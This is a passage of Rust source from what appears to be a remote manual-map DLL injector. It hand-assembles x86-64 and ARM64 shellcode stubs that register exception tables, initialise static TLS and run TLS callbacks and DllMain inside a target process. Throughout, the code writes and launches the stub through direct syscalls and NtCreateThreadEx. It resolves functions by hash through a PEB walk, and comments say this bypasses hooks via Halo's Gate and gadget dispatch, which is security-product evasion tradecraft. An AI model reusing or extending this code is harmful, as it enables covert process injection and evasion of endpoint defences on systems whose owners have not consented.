                                &mut cb_read as *mut _ as u64,
                            );
                            if s.map_or(true, |st| st < 0) || cb_read != 8 {
                                break;
                            }
                            let cb_va = u64::from_le_bytes(cb_buf) as usize;
                            if cb_va == 0 {
                                break;
                            }
                            // Validate: callback must lie within the mapped image.
                            if cb_va >= remote_base as usize
                                && cb_va < remote_base as usize + image_size
                            {
                                tls_callback_vas.push(cb_va);
                            }
                            slot_ptr = slot_ptr.add(1);
                        }
                    }
                }
            }
        }
    }

    // ── Step 5: invoke TLS callbacks and DllMain via a shellcode stub ────
    // DllMain expects (HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved).
    // CreateRemoteThread only passes a single LPVOID parameter, so calling the
    // entry point directly would give DllMain garbage in rcx/rdx/r8.  We write
    // a small position-independent x86-64 stub that:
    //
    //   (a) calls RtlAddFunctionTable to register .pdata if present, then
    //   (b) calls each TLS callback (if any) with DLL_PROCESS_ATTACH, then
    //   (c) sets up the correct calling-convention arguments and calls DllMain.
    //
    // This stub is needed when there is an entry point, TLS callbacks, or a
    // .pdata section to register.  TLS-only DLLs (entry_rva == 0) still need
    // their callbacks invoked before the process starts executing.
    let entry_rva = opt.standard_fields.address_of_entry_point as usize;
    let has_callbacks = !tls_callback_vas.is_empty();

    // Check whether the PE image has exception unwind metadata (.pdata /
    // IMAGE_DIRECTORY_ENTRY_EXCEPTION) that needs to be registered.
    const IMAGE_DIRECTORY_ENTRY_EXCEPTION: usize = 3;
    let has_pdata = opt
        .data_directories
        .data_directories
        .get(IMAGE_DIRECTORY_ENTRY_EXCEPTION)
        .and_then(|e| *e)
        .map(|(_, dd)| dd)
        .map_or(false, |exc_dir| {
            exc_dir.virtual_address != 0 && exc_dir.size > 0
        });

    // The remote DllMain stub is needed when there is an entry point, TLS
    // callbacks, *or* a .pdata section requiring exception registration.
    // Previously, .pdata-only DLLs would skip stub creation entirely, leaving
    // their unwind metadata unregistered.
    if entry_rva != 0 || has_callbacks || has_pdata {
        // ── Step 5a: resolve .pdata and RtlAddFunctionTable ──────────────
        // On x86-64, PE images carry a .pdata section with RUNTIME_FUNCTION
        // entries that the OS exception dispatcher needs for unwinding.
        // We prepend a call to RtlAddFunctionTable in the DllMain stub so
        // exceptions/SEH in the injected DLL work correctly in the target.
        //
        // Use IMAGE_DIRECTORY_ENTRY_EXCEPTION (index 3) for the authoritative
        // entry count.  The .pdata section's SizeOfRawData may be padded to
        // FileAlignment, yielding too many entries; the exception directory's
        // Size field is the true byte count of RUNTIME_FUNCTION entries.
        //
        // RtlAddFunctionTable is an ntdll *runtime helper*, not an NT syscall.
        // It has no SSN.  We resolve its address from ntdll's export table
        // using the same fast/safe path as IAT resolution, then embed the
        // address as an immediate in the shellcode stub.
        #[cfg(target_arch = "x86_64")]
        let (pdata_va, pdata_count, rtl_add_fn_addr) = {
            const IMAGE_DIRECTORY_ENTRY_EXCEPTION: usize = 3;
            let exc_dir = opt
                .data_directories
                .data_directories
                .get(IMAGE_DIRECTORY_ENTRY_EXCEPTION)
                .and_then(|e| *e)
                .map(|(_, dd)| dd);

            let pdata_info = if let Some(exc_dir) = exc_dir {
                if exc_dir.virtual_address != 0 && exc_dir.size > 0 {
                    let va = remote_base as usize + exc_dir.virtual_address as usize;
                    let count = (exc_dir.size as usize / 12) as u32;
                    if count > 0 {
                        Some((va, count, 0usize))
                    } else {
                        None
                    }
                } else {
                    None
                }
            } else {
                None
            };

            if let Some((va, count, _)) = pdata_info {
                // Resolve RtlAddFunctionTable from ntdll using the same
                // fast/safe logic as IAT resolution.
                let fn_addr: usize = if let Some(ref rmod) = remote_module_map {
                    // Safe path: resolve from the remote process's ntdll.
                    match rmod.get("ntdll.dll") {
                        Some(&remote_ntdll_base) => {
                            match resolve_remote_export(
                                target_process,
                                remote_ntdll_base,
                                "RtlAddFunctionTable",
                            ) {
                                Ok(addr) => addr,
                                Err(e) => {
                                    tracing::warn!(
                                        "remote_manual_map: failed to resolve \
                                         RtlAddFunctionTable from remote ntdll: {e}"
                                    );
                                    0
                                }
                            }
                        }
                        None => {
                            tracing::warn!(
                                "remote_manual_map: ntdll.dll not in remote module map; \
                                 skipping .pdata registration"
                            );
                            0
                        }
                    }
                } else {
                    // Fast path: shared ASLR — resolve locally via PEB walk.
                    let ntdll_hash = pe_resolve::hash_str(b"ntdll.dll\0");
                    let ntdll_base = pe_resolve::get_module_handle_by_hash(ntdll_hash).unwrap_or(0);
                    if ntdll_base == 0 {
                        tracing::warn!(
                            "remote_manual_map: ntdll not found via PEB walk; \
                             skipping .pdata registration"
                        );
                        0
                    } else {
                        let fn_hash = pe_resolve::hash_str(b"RtlAddFunctionTable\0");
                        let addr =
                            pe_resolve::get_proc_address_by_hash(ntdll_base, fn_hash).unwrap_or(0);
                        if addr == 0 {
                            tracing::warn!(
                                "remote_manual_map: RtlAddFunctionTable not found \
                                 in ntdll; skipping .pdata registration"
                            );
                        }
                        addr
                    }
                };
                (va, count, fn_addr)
            } else {
                (0usize, 0u32, 0usize) // no .pdata
            }
        };

        // ── Step 5b: build the combined shellcode stub ───────────────────
        // Shellcode (x86-64, position-independent):
        //
        //   ; --- .pdata registration (if present) ---
        //   mov rcx, <pdata_va>          ; PRUNTIME_FUNCTION FunctionTable
        //   mov edx, <entry_count>       ; DWORD EntryCount
        //   mov r8, <remote_base>        ; DWORD64 BaseAddress  (u64, so movabs r8)
        //   mov rax, <RtlAddFunctionTable_addr>
        //   call rax                     ; BOOLEAN result (ignored)
        //
        //   ; --- TLS callbacks (if any) ---
        //   mov rcx, <remote_base>       ; hinstDLL
        //   mov edx, 1                   ; DLL_PROCESS_ATTACH
        //   xor r8d, r8d                 ; lpvReserved = NULL
        //   mov rax, <callback_va>       ; TLS callback address
        //   call rax                     ; (repeat for each callback)
        //
        //   ; --- DllMain invocation ---
        //   mov rcx, <remote_base>       ; HINSTANCE hinstDLL
        //   mov edx, 1                   ; DLL_PROCESS_ATTACH
        //   xor r8d, r8d                 ; lpvReserved = NULL
        //   mov rax, <entry_va>          ; entry point address
        //   call rax
        //   ret

        // ── Step 5a-2: resolve kernel32 functions for static TLS init ────
        // Resolve TlsAlloc, TlsSetValue, GetProcessHeap, and HeapAlloc from
        // the remote kernel32 (safe path) or local PEB walk (fast path) so
        // the shellcode stub can perform static TLS initialisation before
        // invoking TLS callbacks or DllMain.
        #[cfg(target_arch = "x86_64")]
        let (tls_alloc_addr, tls_set_value_addr, get_process_heap_addr, heap_alloc_addr) = {
            let resolve_k32 = |name: &str| -> usize {
                if let Some(ref rmod) = remote_module_map {
                    match rmod.get("kernel32.dll") {
                        Some(&k32_base) => {
                            resolve_remote_export(target_process, k32_base, name).unwrap_or(0)
                        }
                        None => 0,
                    }
                } else {
                    let k32_hash = pe_resolve::hash_str(b"kernel32.dll\0");
                    let k32_base = pe_resolve::get_module_handle_by_hash(k32_hash).unwrap_or(0);
                    if k32_base == 0 {
                        return 0;
                    }
                    let fn_hash = pe_resolve::hash_str(
                        std::ffi::CString::new(name)
                            .unwrap_or_default()
                            .to_bytes_with_nul(),
                    );
                    pe_resolve::get_proc_address_by_hash(k32_base, fn_hash).unwrap_or(0)
                }
            };
            (
                resolve_k32("TlsAlloc"),
                resolve_k32("TlsSetValue"),
                resolve_k32("GetProcessHeap"),
                resolve_k32("HeapAlloc"),
            )
        };

        let mut stub: Vec<u8> = Vec::with_capacity(512);

        #[cfg(target_arch = "x86_64")]
        {
            // ABI prologue: reserve 32 bytes of shadow space and keep RSP
            // 16-byte aligned.  CreateRemoteThread delivers RSP % 16 == 0,
            // so sub rsp,0x20 preserves alignment and provides the 4×8-byte
            // home area that every Windows x64 callee expects.
            stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x20]); // sub rsp, 0x20

            // Emit .pdata registration prologue only if we have valid data.
            if pdata_va != 0 && pdata_count != 0 && rtl_add_fn_addr != 0 {
                // mov rcx, pdata_va          (movabs rcx, imm64)
                stub.extend_from_slice(&[0x48, 0xB9]);
                stub.extend_from_slice(&(pdata_va as u64).to_le_bytes());
                // mov edx, entry_count
                stub.extend_from_slice(&[0xBA]);
                stub.extend_from_slice(&pdata_count.to_le_bytes());
                // mov r8, remote_base        (movabs r8, imm64)
                stub.extend_from_slice(&[0x49, 0xB8]);
                stub.extend_from_slice(&(remote_base as u64).to_le_bytes());
                // mov rax, RtlAddFunctionTable_addr  (movabs rax, imm64)
                stub.extend_from_slice(&[0x48, 0xB8]);
                stub.extend_from_slice(&(rtl_add_fn_addr as u64).to_le_bytes());
                // call rax
                stub.extend_from_slice(&[0xFF, 0xD0]);
            }

            // ── Static TLS initialisation ────────────────────────────────
            // If the PE has a TLS directory with AddressOfIndex set, we must
            // allocate a TLS index, write it to the image, allocate a buffer
            // with a copy of the TLS data template, and call TlsSetValue so
            // __declspec(thread) variables are properly initialised.
            //
            // The shellcode performs (all calls use the Windows x64 ABI):
            //   1. TlsAlloc() → tls_index (in eax)
            //   2. Write tls_index to [AddressOfIndex]
            //   3. GetProcessHeap() → heap
            //   4. HeapAlloc(heap, HEAP_ZERO_MEMORY, total_size) → buffer
            //   5. memcpy(buffer, data_start, template_size) via rep movsb
            //   6. TlsSetValue(tls_index, buffer)
            if static_tls_index_ptr != 0
                && tls_alloc_addr != 0
                && tls_set_value_addr != 0
                && get_process_heap_addr != 0
                && heap_alloc_addr != 0
            {
                let template_size = if static_tls_data_end > static_tls_data_start {
                    static_tls_data_end - static_tls_data_start
                } else {
                    0usize
                };
                let total_size = template_size.saturating_add(static_tls_zero_fill as usize);

                // Step 1: TlsAlloc() → eax = tls_index
                // mov rax, TlsAlloc
                stub.extend_from_slice(&[0x48, 0xB8]);
                stub.extend_from_slice(&(tls_alloc_addr as u64).to_le_bytes());
                // call rax
                stub.extend_from_slice(&[0xFF, 0xD0]);

                // Step 2: Write tls_index to [AddressOfIndex]
                // mov rcx, static_tls_index_ptr
                stub.extend_from_slice(&[0x48, 0xB9]);
                stub.extend_from_slice(&(static_tls_index_ptr as u64).to_le_bytes());
                // mov [rcx], eax   (32-bit DWORD index)
                stub.extend_from_slice(&[0x89, 0x01]);

                // Only allocate and copy if there is data to set up.
                // Skip the HeapAlloc/TlsSetValue block when template is empty
                // but the index has still been written (zero-length TLS data
                // with only zero-fill is a valid corner case — we skip the
                // buffer allocation and TlsSetValue with a NULL pointer).
                if total_size > 0 {
                    // Step 3: GetProcessHeap() → heap in rax
                    // mov rax, GetProcessHeap
                    stub.extend_from_slice(&[0x48, 0xB8]);
                    stub.extend_from_slice(&(get_process_heap_addr as u64).to_le_bytes());
                    // call rax
                    stub.extend_from_slice(&[0xFF, 0xD0]);

                    // Step 4: HeapAlloc(heap, HEAP_ZERO_MEMORY, total_size)
                    //   rcx = heap (already in rax from GetProcessHeap)
                    //   edx = HEAP_ZERO_MEMORY (0x00000008)
                    //   r8  = total_size
                    // mov rcx, rax
                    stub.extend_from_slice(&[0x48, 0x89, 0xC1]);
                    // mov edx, 0x00000008
                    stub.extend_from_slice(&[0xBA, 0x08, 0x00, 0x00, 0x00]);
                    // movabs r8, total_size
                    stub.extend_from_slice(&[0x49, 0xB8]);
                    stub.extend_from_slice(&(total_size as u64).to_le_bytes());
                    // mov rax, HeapAlloc
                    stub.extend_from_slice(&[0x48, 0xB8]);
                    stub.extend_from_slice(&(heap_alloc_addr as u64).to_le_bytes());
                    // call rax  → buffer in rax
                    stub.extend_from_slice(&[0xFF, 0xD0]);

                    // Step 5: Copy TLS template data (buffer in rax, need to save it)
                    // push rax (save buffer pointer)
                    stub.extend_from_slice(&[0x50]);
                    // Only memcpy if template_size > 0
                    if template_size > 0 && static_tls_data_start != 0 {
                        // mov rsi, static_tls_data_start
                        stub.extend_from_slice(&[0x48, 0xBE]);
                        stub.extend_from_slice(&(static_tls_data_start as u64).to_le_bytes());
                        // pop rdi (buffer = destination) ; push it back after
                        stub.extend_from_slice(&[0x5F]);
                        // push rdi (save buffer again)
                        stub.extend_from_slice(&[0x57]);
                        // mov rcx, template_size
                        stub.extend_from_slice(&[0x48, 0xB9]);
                        stub.extend_from_slice(&(template_size as u64).to_le_bytes());
                        // rep movsb
                        stub.extend_from_slice(&[0xF3, 0xA4]);
                    } else {
                        // No template data to copy; pop buffer into expected place
                        // pop rax ; push rax  (effectively a no-op but keeps stack balanced)
                        stub.extend_from_slice(&[0x58]); // pop rax
                        stub.extend_from_slice(&[0x50]); // push rax
                    }

                    // Step 6: TlsSetValue(tls_index, buffer)
                    // We need tls_index (from the original TlsAlloc call) and buffer.
                    // tls_index was written to [static_tls_index_ptr] in step 2.
                    // buffer is on the stack from step 5.
                    // pop rdi → buffer
                    stub.extend_from_slice(&[0x5F]);
                    // mov rcx, [static_tls_index_ptr]  (tls_index)
                    stub.extend_from_slice(&[0x48, 0xB9]);
                    stub.extend_from_slice(&(static_tls_index_ptr as u64).to_le_bytes());
                    // mov ecx, [rcx]  (load DWORD index)
                    stub.extend_from_slice(&[0x8B, 0x09]);
                    // mov rdx, rdi    (buffer)
                    stub.extend_from_slice(&[0x48, 0x89, 0xFA]);
                    // mov rax, TlsSetValue
                    stub.extend_from_slice(&[0x48, 0xB8]);
                    stub.extend_from_slice(&(tls_set_value_addr as u64).to_le_bytes());
                    // call rax
                    stub.extend_from_slice(&[0xFF, 0xD0]);
                }
            }

            // Emit TLS callback invocations before DllMain.
            // Each callback: TlsCallback(hinstDLL, DLL_PROCESS_ATTACH, NULL)
            for &cb_va in &tls_callback_vas {
                // mov rcx, remote_base       (hinstDLL)
                stub.extend_from_slice(&[0x48, 0xB9]);
                stub.extend_from_slice(&(remote_base as u64).to_le_bytes());
                // mov edx, 1                 (DLL_PROCESS_ATTACH)
                stub.extend_from_slice(&[0xBA, 0x01, 0x00, 0x00, 0x00]);
                // xor r8d, r8d               (lpvReserved = NULL)
                stub.extend_from_slice(&[0x45, 0x31, 0xC0]);
                // mov rax, cb_va             (callback address)
                stub.extend_from_slice(&[0x48, 0xB8]);
                stub.extend_from_slice(&(cb_va as u64).to_le_bytes());
                // call rax
                stub.extend_from_slice(&[0xFF, 0xD0]);
            }

            // DllMain invocation (only when the PE has an entry point).
            //   mov rcx, <remote_base>      ; HINSTANCE hinstDLL
            if entry_rva != 0 {
                let entry_va = remote_base as usize + entry_rva;
                stub.extend_from_slice(&[0x48, 0xB9]);
                stub.extend_from_slice(&(remote_base as u64).to_le_bytes());
                //   mov edx, 1                  ; DLL_PROCESS_ATTACH
                stub.extend_from_slice(&[0xBA, 0x01, 0x00, 0x00, 0x00]);
                //   xor r8d, r8d                ; lpvReserved = NULL
                stub.extend_from_slice(&[0x45, 0x31, 0xC0]);
                //   mov rax, <entry_va>         ; entry point address
                stub.extend_from_slice(&[0x48, 0xB8]);
                stub.extend_from_slice(&(entry_va as u64).to_le_bytes());
                //   call rax
                stub.extend_from_slice(&[0xFF, 0xD0]);
            }
            // ABI epilogue: restore shadow space before returning.
            stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x20]); // add rsp, 0x20
                                                               //   ret
            stub.extend_from_slice(&[0xC3]);
        }

        #[cfg(target_arch = "aarch64")]
        {
            // ARM64 ABI prologue: stp x29, x30, [sp, #-16]!  (save frame/return)
            // mov x29, sp
            push_arm64_instruction(&mut stub, 0xA9BF7BFD); // stp x29, x30, [sp, #-16]!
            push_arm64_instruction(&mut stub, 0x910003FD); // mov x29, sp

            // ── ARM64 .pdata registration via RtlAddFunctionTable ──────────
            // ARM64 PE images carry exception metadata in the exception
            // directory (IMAGE_DIRECTORY_ENTRY_EXCEPTION) just like x86_64.
            // Without registering these RUNTIME_FUNCTION entries, any SEH or
            // C++ exception in the injected DLL will terminate the process.
            //
            // RtlAddFunctionTable on ARM64 has the same signature as x86_64:
            //   BOOLEAN RtlAddFunctionTable(
            //     PRUNTIME_FUNCTION FunctionTable,
            //     DWORD EntryCount,
            //     DWORD64 BaseAddress);
            //
            // We resolve it from ntdll in the target process using the same
            // fast/safe import resolution path used for IAT resolution.
            let (arm_pdata_va, arm_pdata_count, arm_rtl_add_fn_addr) = {
                let exc_dir = opt
                    .data_directories
                    .data_directories
                    .get(IMAGE_DIRECTORY_ENTRY_EXCEPTION)
                    .and_then(|e| *e)
                    .map(|(_, dd)| dd);

                let pdata_info = if let Some(exc_dir) = exc_dir {
                    if exc_dir.virtual_address != 0 && exc_dir.size > 0 {
                        let va = remote_base as usize + exc_dir.virtual_address as usize;
                        let count = (exc_dir.size as usize / 12) as u32;
                        if count > 0 {
                            Some((va, count, 0usize))
                        } else {
                            None
                        }
                    } else {
                        None
                    }
                } else {
                    None
                };

                if let Some((va, count, _)) = pdata_info {
                    let fn_addr: usize = if let Some(ref rmod) = remote_module_map {
                        match rmod.get("ntdll.dll") {
                            Some(&remote_ntdll_base) => {
                                match resolve_remote_export(
                                    target_process,
                                    remote_ntdll_base,
                                    "RtlAddFunctionTable",
                                ) {
                                    Ok(addr) => addr,
                                    Err(e) => {
                                        tracing::warn!(
                                            "remote_manual_map (ARM64): failed to resolve \
                                             RtlAddFunctionTable from remote ntdll: {e}"
                                        );
                                        0
                                    }
                                }
                            }
                            None => {
                                tracing::warn!(
                                    "remote_manual_map (ARM64): ntdll.dll not in remote module \
                                     map; skipping .pdata registration"
                                );
                                0
                            }
                        }
                    } else {
                        // Fast path: shared ASLR — resolve locally via PEB walk.
                        let ntdll_hash = pe_resolve::hash_str(b"ntdll.dll\0");
                        let ntdll_base =
                            pe_resolve::get_module_handle_by_hash(ntdll_hash).unwrap_or(0);
                        if ntdll_base == 0 {
                            tracing::warn!(
                                "remote_manual_map (ARM64): ntdll not found via PEB walk; \
                                 skipping .pdata registration"
                            );
                            0
                        } else {
                            let fn_hash = pe_resolve::hash_str(b"RtlAddFunctionTable\0");
                            let addr = pe_resolve::get_proc_address_by_hash(ntdll_base, fn_hash)
                                .unwrap_or(0);
                            if addr == 0 {
                                tracing::warn!(
                                    "remote_manual_map (ARM64): RtlAddFunctionTable not found \
                                     in ntdll; skipping .pdata registration"
                                );
                            }
                            addr
                        }
                    };
                    (va, count, fn_addr)
                } else {
                    (0usize, 0u32, 0usize)
                }
            };

            // Emit the RtlAddFunctionTable call for ARM64:
            //   mov x0, <pdata_va>          ; PRUNTIME_FUNCTION
            //   mov x1, <entry_count>       ; EntryCount
            //   mov x2, <remote_base>       ; BaseAddress
            //   mov x16, <fn_addr>          ; function address
            //   blr x16                     ; call
            if arm_pdata_va != 0 && arm_pdata_count != 0 && arm_rtl_add_fn_addr != 0 {
                push_arm64_mov_imm64(&mut stub, 0, arm_pdata_va as u64);
                push_arm64_mov_imm64(&mut stub, 1, arm_pdata_count as u64);
                push_arm64_mov_imm64(&mut stub, 2, remote_base as u64);
                push_arm64_mov_imm64(&mut stub, 16, arm_rtl_add_fn_addr as u64);
                push_arm64_blr(&mut stub, 16);
            }

            // ── ARM64 static TLS initialisation ──────────────────────────
            // Same logic as the x86-64 path: allocate a TLS index via
            // TlsAlloc, write it to AddressOfIndex, allocate a zeroed
            // buffer large enough for the data template + zero-fill, copy
            // the template in, and bind the buffer with TlsSetValue.
            //
            // Register usage (AAPCS64 caller-saved):
            //   x0-x7   arguments / results
            //   x9-x15  temporaries
            //   x16     intra-procedure-call scratch (IP0)
            if static_tls_index_ptr != 0 {
                let resolve_k32_arm = |name: &str| -> usize {
                    if let Some(ref rmod) = remote_module_map {
                        match rmod.get("kernel32.dll") {
                            Some(&k32_base) => {
                                resolve_remote_export(target_process, k32_base, name).unwrap_or(0)
                            }
                            None => 0,
                        }
                    } else {
                        let k32_hash = pe_resolve::hash_str(b"kernel32.dll\0");
                        let k32_base = pe_resolve::get_module_handle_by_hash(k32_hash).unwrap_or(0);
                        if k32_base == 0 {
                            return 0;
                        }
                        let fn_hash = pe_resolve::hash_str(
                            std::ffi::CString::new(name)
                                .unwrap_or_default()
                                .to_bytes_with_nul(),
                        );
                        pe_resolve::get_proc_address_by_hash(k32_base, fn_hash).unwrap_or(0)
                    }
                };
                let arm_tls_alloc = resolve_k32_arm("TlsAlloc");
                let arm_tls_set_value = resolve_k32_arm("TlsSetValue");
                let arm_get_process_heap = resolve_k32_arm("GetProcessHeap");
                let arm_heap_alloc = resolve_k32_arm("HeapAlloc");

                if arm_tls_alloc != 0
                    && arm_tls_set_value != 0
                    && arm_get_process_heap != 0
                    && arm_heap_alloc != 0
                {
                    let arm_template_size = if static_tls_data_end > static_tls_data_start {
                        static_tls_data_end - static_tls_data_start
                    } else {
                        0usize
                    };
                    let arm_total_size =
                        arm_template_size.saturating_add(static_tls_zero_fill as usize);

                    // Step 1: TlsAlloc() → x0 = tls_index
                    push_arm64_mov_imm64(&mut stub, 16, arm_tls_alloc as u64);
                    push_arm64_blr(&mut stub, 16);

                    // Step 2: Write tls_index to [AddressOfIndex]
                    //   mov x9, index_ptr
                    //   str w0, [x9]
                    push_arm64_mov_imm64(&mut stub, 9, static_tls_index_ptr as u64);
                    push_arm64_instruction(&mut stub, 0xB9000120); // str w0, [x9]

                    if arm_total_size > 0 {
                        // Save tls_index for later: mov x10, x0
                        push_arm64_instruction(&mut stub, 0xAA0003EA);

                        // Step 3: GetProcessHeap() → x0
                        push_arm64_mov_imm64(&mut stub, 16, arm_get_process_heap as u64);
                        push_arm64_blr(&mut stub, 16);

                        // Step 4: HeapAlloc(heap, HEAP_ZERO_MEMORY, total_size)
                        //   Save heap handle → x3
                        //   x0 = heap, x1 = 0x8, x2 = total_size
                        push_arm64_instruction(&mut stub, 0xAA0003E3); // mov x3, x0  (heap)
                        push_arm64_instruction(&mut stub, 0xD2800101); // mov x1, #8
                        push_arm64_mov_imm64(&mut stub, 2, arm_total_size as u64);
                        push_arm64_instruction(&mut stub, 0xAA0303E0); // mov x0, x3  (heap)
                        push_arm64_mov_imm64(&mut stub, 16, arm_heap_alloc as u64);
                        push_arm64_blr(&mut stub, 16);
                        // x0 = allocated buffer

                        // Step 5: Copy TLS data template (byte-by-byte loop)
                        if arm_template_size > 0 && static_tls_data_start != 0 {
                            // Save buffer: mov x11, x0
                            push_arm64_instruction(&mut stub, 0xAA0003EB);
                            // Set up memcpy(dst=x0, src=x1, count=x2)
                            push_arm64_instruction(&mut stub, 0xAA0B03E0); // mov x0, x11
                            push_arm64_mov_imm64(&mut stub, 1, static_tls_data_start as u64);
                            push_arm64_mov_imm64(&mut stub, 2, arm_template_size as u64);
                            // Loop:
                            //   cbz x2, after
                            //   ldrb w3, [x1], #1
                            //   strb w3, [x0], #1
                            //   sub x2, x2, #1
                            //   b loop
                            // after:
                            let loop_start = stub.len();
                            stub.extend_from_slice(&[0u8; 4]); // cbz placeholder
                            push_arm64_instruction(&mut stub, 0x38606863); // ldrb w3,[x1],#1
                            push_arm64_instruction(&mut stub, 0x38000483); // strb w3,[x0],#1
                            push_arm64_instruction(&mut stub, 0xD1000C42); // sub x2,x2,#1
                            let cur = stub.len();
                            let off = (loop_start as i32 - cur as i32) / 4;
                            push_arm64_instruction(
                                &mut stub,
                                0x14000000u32 | ((off as u32) & 0x03FFFFFF),
                            );
                            let cbz_off = ((stub.len() - loop_start) / 4 - 1) as u32;
                            let cbz = 0xB4000000u32 | (2u32 << 5) | (cbz_off & 0xFFFF);
                            stub[loop_start..loop_start + 4].copy_from_slice(&cbz.to_le_bytes());
                            // Restore buffer: mov x0, x11
                            push_arm64_instruction(&mut stub, 0xAA0B03E0);
                        }

                        // Step 6: TlsSetValue(tls_index, buffer)
                        //   x0 = tls_index, x1 = buffer
                        push_arm64_instruction(&mut stub, 0xAA0003E1); // mov x1, x0  (buffer→x1)
                        push_arm64_instruction(&mut stub, 0x2A0A03E0); // mov w0, w10  (index→x0)
                        push_arm64_mov_imm64(&mut stub, 16, arm_tls_set_value as u64);
                        push_arm64_blr(&mut stub, 16);
                    }
                }
            }

            // TLS callbacks
            for &cb_va in &tls_callback_vas {
                push_arm64_dll_entry_call(&mut stub, cb_va as u64, remote_base as u64);
            }
            if entry_rva != 0 {
                let entry_va = remote_base as usize + entry_rva;
                push_arm64_dll_entry_call(&mut stub, entry_va as u64, remote_base as u64);
            }
            // ABI epilogue: restore frame/return and return
            push_arm64_instruction(&mut stub, 0xA8C17BFD); // ldp x29, x30, [sp], #16
            push_arm64_instruction(&mut stub, 0xD65F_03C0); // ret
        }

        #[cfg(target_arch = "x86")]
        {
            if entry_rva != 0 {
                let entry_va = remote_base as usize + entry_rva;
                push_x86_dll_entry_call(&mut stub, entry_va as u32, remote_base as u32);
            }
            stub.push(0xC3);
        }

        // Allocate memory for the stub (RW first so we can write it).
        let mut stub_mem: *mut c_void = std::ptr::null_mut();
        let mut stub_alloc_size = stub.len();
        let stub_alloc_status = nt_syscall::syscall!(
            "NtAllocateVirtualMemory",
            target_process as u64,
            &mut stub_mem as *mut _ as u64,
            0u64,
            &mut stub_alloc_size as *mut _ as u64,
            (MEM_COMMIT | MEM_RESERVE) as u64,
            PAGE_READWRITE as u64,
        );
        if stub_alloc_status.as_ref().map_or(true, |s| *s < 0) || stub_mem.is_null() {
            return Err(anyhow!(
                "NtAllocateVirtualMemory for DllMain stub failed: status={:?}",
                stub_alloc_status
            ));
        }

        // Write stub bytes via NtWriteVirtualMemory dispatched through nt_syscall.
        let mut written = 0usize;
        let write_status = nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            target_process as u64,
            stub_mem as u64,
            stub.as_ptr() as u64,
            stub.len() as u64,
            &mut written as *mut _ as u64,
        );
        if write_status.as_ref().map_or(true, |s| *s < 0) || written != stub.len() {
            return Err(anyhow!(
                "NtWriteVirtualMemory for DllMain stub failed: status={:?}, wrote={}, expected={}",
                write_status,
                written,
                stub.len()
            ));
        }

        // Make the stub executable (RX only — no need for write after writing).
        let mut prot_base = stub_mem;
        let mut prot_size = stub.len();
        let mut old_prot = 0u32;
        let protect_status = nt_syscall::syscall!(
            "NtProtectVirtualMemory",
            target_process as u64,
            &mut prot_base as *mut _ as u64,
            &mut prot_size as *mut _ as u64,
            PAGE_EXECUTE_READ as u64,
            &mut old_prot as *mut _ as u64,
        );
        if protect_status.as_ref().map_or(true, |s| *s < 0) {
            return Err(anyhow!(
                "NtProtectVirtualMemory for DllMain stub failed: status={:?}",
                protect_status
            ));
        }

        let _ = nt_syscall::syscall!(
            "NtFlushInstructionCache",
            target_process as u64,
            stub_mem as u64,
            stub.len() as u64,
        );

        // M-27: Use NtCreateThreadEx via nt_syscall::syscall! instead of
        // hookable CreateRemoteThread.  The syscall! macro resolves the SSN
        // through Halo's Gate / clean ntdll mapping and dispatches via a
        // gadget address, bypassing both IAT and inline hooks on the ntdll stub.
        let mut h_thread: *mut std::ffi::c_void = std::ptr::null_mut();
        let status = nt_syscall::syscall!(
            "NtCreateThreadEx",
            &mut h_thread as *mut _ as u64,        // ThreadHandle
            THREAD_INJECT_ACCESS,                  // minimal thread access
            std::ptr::null_mut::<c_void>() as u64, // ObjectAttributes
            target_process as u64,                 // ProcessHandle
            stub_mem as u64,                       // StartRoutine
            std::ptr::null_mut::<c_void>() as u64, // Argument
            0u64,                                  // CreateFlags (run immediately)
            0u64,                                  // ZeroBits
            0u64,                                  // StackSize
            0u64,                                  // MaximumStackSize
            std::ptr::null_mut::<c_void>() as u64, // AttributeList
        );
        if status.as_ref().map_or(true, |s| *s < 0) || h_thread.is_null() {
            return Err(anyhow!(
                "NtCreateThreadEx for DllMain stub failed: {:?}",
                status
            ));
        }
        // Close the thread handle immediately; we don't wait for it.
        pe_resolve::close_handle(h_thread as *mut core::ffi::c_void);
    }

    Ok(remote_base)
}
